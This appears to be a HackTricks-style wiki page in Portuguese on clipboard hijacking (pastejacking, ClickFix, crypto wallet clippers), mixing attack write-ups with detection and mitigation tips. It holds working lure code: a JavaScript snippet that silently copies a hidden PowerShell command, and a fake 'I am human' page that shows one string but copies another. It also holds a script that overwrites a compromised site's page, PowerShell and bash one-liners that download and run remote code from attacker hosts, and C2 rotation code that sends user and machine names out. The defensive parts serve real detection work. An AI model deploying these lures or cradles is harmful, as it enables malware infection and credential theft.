# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Never paste anything you did not copy yourself." – conselho antigo, mas ainda válido

## Visão geral

Clipboard hijacking – também conhecido como *pastejacking* – explora o fato de que usuários rotineiramente copiam e colam comandos sem inspecioná-los. Uma página web maliciosa (ou qualquer contexto com JavaScript, como uma Electron ou Desktop application) insere programaticamente texto controlado pelo atacante no system clipboard. As vítimas são incentivadas, normalmente por instruções de social engineering cuidadosamente elaboradas, a pressionar **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), ou abrir um terminal e *colar* o conteúdo da clipboard, executando imediatamente comandos arbitrários.

Como **nenhum arquivo é baixado e nenhum anexo é aberto**, a técnica contorna a maioria dos controles de segurança de e-mail e conteúdo web que monitoram anexos, macros ou execução direta de comandos. Por isso, o ataque é popular em campanhas de phishing que entregam famílias comuns de malware como NetSupport RAT, Latrodectus loader ou Lumma Stealer.

## Wallet-address replacement clippers

Outra variante de **clipboard hijacking** não cola comandos, de forma alguma: ela espera até que a vítima copie um **cryptocurrency wallet address**, então o troca silenciosamente por um controlado pelo atacante pouco antes do paste. Isso é especialmente eficaz contra formatos longos de wallet porque os usuários frequentemente verificam apenas os primeiros/últimos caracteres.

Características comuns no mundo real:
- **Thin loader + nested payload**: o app/exe visível parece uma ferramenta legítima de trading ou "profit", enquanto o clipper real fica escondido mais profundamente no bundle (por exemplo, um .NET loader iniciando um nested Rust payload).
- **Regex-driven replacement**: o malware corresponde a strings como `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, ou até strings genéricas **de 44 caracteres tipo Solana** e as reescreve para wallets do atacante.
- **Wallet rotation at scale**: amostras modernas para Windows podem embutir **milhares** de wallets de substituição por moeda em vez de um único endereço estático, reduzindo o desgaste da reputação da wallet após cada roubo.

### Windows clipper flow

Uma implementação comum é uma janela oculta registrada com **`AddClipboardFormatListener`**. Em cada atualização da clipboard, o malware normalmente chama:
- **`OpenClipboard`** → acessa os dados atuais da clipboard.
- **`GetClipboardData`** → lê o texto.
- **`EmptyClipboard`** + **`SetClipboardData`** → substitui a string da wallet pelo valor do atacante.

Minimal hunting regexes frequentemente vistos em clippers:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
Persistência em nível de usuário é suficiente para causar impacto. Um padrão observado é:
- Copiar payload para **`%APPDATA%\silke\silke.exe`**
- Criar um **Startup-folder LNK** em `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Ideias de detecção:
- Processos que chamam clipboard APIs continuamente enquanto também gravam em `%APPDATA%` e na pasta **Startup** do usuário.
- Criação de novo LNK/executable seguida por reescritas do clipboard de wallet-address.
- Arquivos compactados ou bundles de fake-software contendo muitos arquivos não utilizados, além de um pequeno launcher que inicia um nested binary.

### macOS remoção de quarantine socialmente engenheirada + persistência via LaunchAgent

No macOS, algumas campanhas enviam um helper **`unlocker.command`** e instruem a vítima a clicar com o botão direito → **Open** se o Gatekeeper disser que o app está danificado ou é de um desenvolvedor não identificado. O script simplesmente remove a quarantine e inicia o `.app` próximo:
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
Isso **não** é um exploit do Gatekeeper; é um **bypass de quarantine socialmente engenheirado** que abusa do fato de que as decisões do Gatekeeper dependem do xattr `com.apple.quarantine`.

Após a execução, o clipper pode persistir como o usuário atual escrevendo:
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent com `RunAtLoad` e `KeepAlive`

Um detalhe defensivo útil é que algumas amostras implementam um **watchdog de auto-recuperação** que reescreve o LaunchAgent e o wrapper a cada ~30 segundos. Se você remover o plist primeiro **sem matar o processo em execução**, o malware pode recriá-lo imediatamente. Ordem segura de limpeza:
1. Mate o processo ativo do clipper.
2. Descarregue/remova o plist do LaunchAgent.
3. Apague `~/launch.sh` e o payload copiado.

### Delivery note: fake reputation as a force multiplier

Para esta família, o malware em si pode permanecer tecnicamente simples enquanto a **camada de distribuição** faz o trabalho pesado: estrelas/forks falsos no GitHub, avaliações/downloads no SourceForge, comentários/visualizações em tutoriais no YouTube e comentários/votos benignos no VirusTotal são usados para fazer o binário parecer confiável antes da execução.

## Forced copy buttons and hidden payloads (macOS one-liners)

Alguns infostealers para macOS clonam sites de instaladores (por exemplo, Homebrew) e **forçam o uso de um botão “Copy”** para que os usuários não possam selecionar apenas o texto visível. A entrada da clipboard contém o comando de instalação esperado mais um payload Base64 anexado (por exemplo, `...; echo <b64> | base64 -d | sh`), então um único paste executa ambos enquanto a UI oculta a etapa extra.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Campanhas mais antigas usavam `document.execCommand('copy')`, enquanto as mais novas dependem da **Clipboard API** assíncrona (`navigator.clipboard.writeText`).

## O fluxo ClickFix / ClearFake

1. O usuário visita um site typosquatted ou comprometido (por exemplo, `docusign.sa[.]com`)
2. O JavaScript injetado do **ClearFake** chama um helper `unsecuredCopyToClipboard()` que armazena silenciosamente na clipboard uma linha única do PowerShell codificada em Base64.
3. As instruções em HTML dizem à vítima para: *“Pressione **Win + R**, cole o comando e pressione Enter para resolver o problema.”*
4. `powershell.exe` é executado, baixando um archive que contém um executável legítimo mais uma DLL maliciosa (classic DLL sideloading).
5. O loader descriptografa etapas adicionais, injeta shellcode e instala persistence (por exemplo, scheduled task) – executando, no fim, NetSupport RAT / Latrodectus / Lumma Stealer.

### Exemplo de cadeia do NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (Java WebStart legítimo) procura em seu diretório por `msvcp140.dll`.
* O DLL malicioso resolve APIs dinamicamente com **GetProcAddress**, baixa dois binários (`data_3.bin`, `data_4.bin`) via **curl.exe**, descriptografa-os usando uma rolling XOR key `"https://google.com/"`, injeta o shellcode final e descompacta **client32.exe** (NetSupport RAT) para `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Faz o download de `la.txt` com **curl.exe**
2. Executa o downloader JScript dentro de **cscript.exe**
3. Busca um payload MSI → solta `libcef.dll` ao lado de um aplicativo assinado → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
A chamada **mshta** inicia um script oculto do PowerShell que recupera `PartyContinued.exe`, extrai `Boat.pst` (CAB), reconstrói `AutoIt3.exe` por meio de `extrac32` e concatenação de arquivos e, por fim, executa um script `.a3x` que exfiltra credenciais do browser para `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK com C2 rotativo (PureHVNC)

Algumas campanhas ClickFix pulam completamente os downloads de arquivos e instruem as vítimas a colar um one-liner que busca e executa JavaScript via WSH, o persiste e rotaciona o C2 diariamente. Cadeia observada de exemplo:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Características principais
- URL ofuscada invertida em runtime para frustrar inspeção casual.
- JavaScript se persiste via um Startup LNK (WScript/CScript), e seleciona o C2 pelo dia atual – permitindo rotação rápida de domínio.

Fragmento mínimo de JS usado para rotacionar C2s por data:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
A próxima etapa normalmente implanta um loader que estabelece persistence e baixa um RAT (por exemplo, PureHVNC), muitas vezes fixando TLS a um certificado hardcoded e fragmentando o tráfego.

Ideias de detection específicas para esta variante
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (ou `cscript.exe`).
- Startup artifacts: LNK em `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invocando WScript/CScript com um caminho JS em `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU e telemetria de command-line contendo `.split('').reverse().join('')` ou `eval(a.responseText)`.
- Repetidos `powershell -NoProfile -NonInteractive -Command -` com payloads grandes em stdin para alimentar scripts longos sem command lines longas.
- Scheduled Tasks que depois executam LOLBins como `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` sob uma tarefa/path com aparência de updater (por exemplo, `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Hostnames e URLs de C2 com rotação diária e padrão `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Correlacione eventos de escrita na clipboard seguidos de paste via Win+R e execução imediata de `powershell.exe`.


Blue-teams podem combinar telemetria de clipboard, criação de processos e registry para identificar abuso de pastejacking:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` mantém um histórico de comandos do **Win + R** – procure entradas incomuns em Base64 / ofuscadas.
* Security Event ID **4688** (Process Creation) onde `ParentImage` == `explorer.exe` e `NewProcessName` em { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** para criação de arquivos em `%LocalAppData%\Microsoft\Windows\WinX\` ou pastas temporárias logo antes do evento 4688 suspeito.
* Sensores de clipboard do EDR (se presentes) – correlacione `Clipboard Write` seguido imediatamente por um novo processo do PowerShell.

## Páginas de verificação no estilo IUAM (ClickFix Generator): copy-to-console da clipboard + payloads awareness de OS

Campanhas recentes produzem em massa páginas falsas de verificação de CDN/browser ("Just a moment…", estilo IUAM) que induzem usuários a copiar comandos específicos do OS da clipboard para consoles nativos. Isso desloca a execução para fora do sandbox do browser e funciona em Windows e macOS.

Características principais das páginas geradas pelo builder
- Detecção de OS via `navigator.userAgent` para adaptar payloads (Windows PowerShell/CMD vs. macOS Terminal). Decoys/no-ops opcionais para OS não suportados, para manter a ilusão.
- Auto-copy para clipboard em ações benignas da UI (checkbox/Copy), enquanto o texto visível pode ser diferente do conteúdo da clipboard.
- Bloqueio de mobile e um popover com instruções passo a passo: Windows → Win+R→paste→Enter; macOS → abrir Terminal→paste→Enter.
- Ofuscação opcional e injector de arquivo único para sobrescrever o DOM de um site comprometido com uma UI de verificação estilizada com Tailwind (sem necessidade de novo registro de domínio).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
Persistência do macOS da execução inicial
- Use `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` para que a execução continue após o terminal ser fechado, reduzindo artefatos visíveis.

Tomada de página em linha em sites comprometidos
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Ideias de detecção e hunting específicas para iscas no estilo IUAM
- Web: Páginas que vinculam a Clipboard API a widgets de verificação; mismatch entre o texto exibido e o payload da área de transferência; branching por `navigator.userAgent`; Tailwind + replace de página única em contextos suspeitos.
- Endpoint Windows: `explorer.exe` → `powershell.exe`/`cmd.exe` logo após uma interação no browser; instaladores batch/MSI executados de `%TEMP%`.
- Endpoint macOS: Terminal/iTerm iniciando `bash`/`curl`/`base64 -d` com `nohup` perto de eventos do browser; background jobs que sobrevivem ao fechamento do terminal.
- Correlacione histórico `RunMRU` do Win+R e writes na clipboard com criação subsequente de processos de console.

Veja também técnicas de apoio

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / evoluções do ClickFix (ClearFake, Scarlet Goldfinch)

- ClearFake continua a comprometer sites WordPress e injetar JavaScript loader que encadeia hosts externos (Cloudflare Workers, GitHub/jsDelivr) e até chamadas de blockchain “etherhiding” (por exemplo, POSTs para endpoints da API do Binance Smart Chain como `bsc-testnet.drpc[.]org`) para obter a lógica atual da isca. Overlays recentes usam fortemente fake CAPTCHAs que instruem os usuários a copiar/colar uma linha única (T1204.004) em vez de baixar qualquer coisa.
- A execução inicial está cada vez mais delegada a hosts de script assinados/LOLBAS. Em janeiro de 2026, cadeias trocaram o uso anterior de `mshta` por `SyncAppvPublishingServer.vbs` embutido executado via `WScript.exe`, passando argumentos no estilo PowerShell com aliases/wildcards para buscar conteúdo remoto:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` é assinado e normalmente usado pelo App-V; combinado com `WScript.exe` e argumentos incomuns (`gal`/`gcm` aliases, cmdlets com wildcard, URLs do jsDelivr) ele se torna uma etapa LOLBAS de alto sinal para ClearFake.
- Em fevereiro de 2026, os payloads falsos de CAPTCHA voltaram a usar apenas download cradles em PowerShell. Dois exemplos ativos:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- First chain is an in-memory `iex(irm ...)` grabber; the second stages via `WinHttp.WinHttpRequest.5.1`, writes a temp `.ps1`, then launches with `-ep bypass` in a hidden window.

Dicas de detecção/caça para essas variantes
- Linhagem de processo: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` ou cradles de PowerShell imediatamente após writes no clipboard/Win+R.
- Palavras-chave na linha de comando: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, domínios jsDelivr/GitHub/Cloudflare Worker, ou padrões `iex(irm ...)` em IP bruto.
- Rede: conexões de saída para hosts CDN worker ou endpoints RPC de blockchain vindos de hosts de script/PowerShell logo após navegação web.
- File/registry: criação temporária de `.ps1` em `%TEMP%` mais entradas RunMRU contendo esses one-liners; bloquear/alertar em signed-script LOLBAS (WScript/cscript/mshta) executando com URLs externas ou strings alias ofuscadas.

## Mitigações

1. Browser hardening – desabilitar acesso de escrita ao clipboard (`dom.events.asyncClipboard.clipboardItem` etc.) ou exigir gesto do usuário.
2. Security awareness – ensinar os usuários a *digitar* comandos sensíveis ou colá-los primeiro em um editor de texto.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control para bloquear one-liners arbitrários.
4. Network controls – bloquear requisições de saída para domínios conhecidos de pastejacking e C2 de malware.

## Related Tricks

* **Discord Invite Hijacking** often abuses the same ClickFix approach after luring users into a malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)

{{#include ../../banners/hacktricks-training.md}}
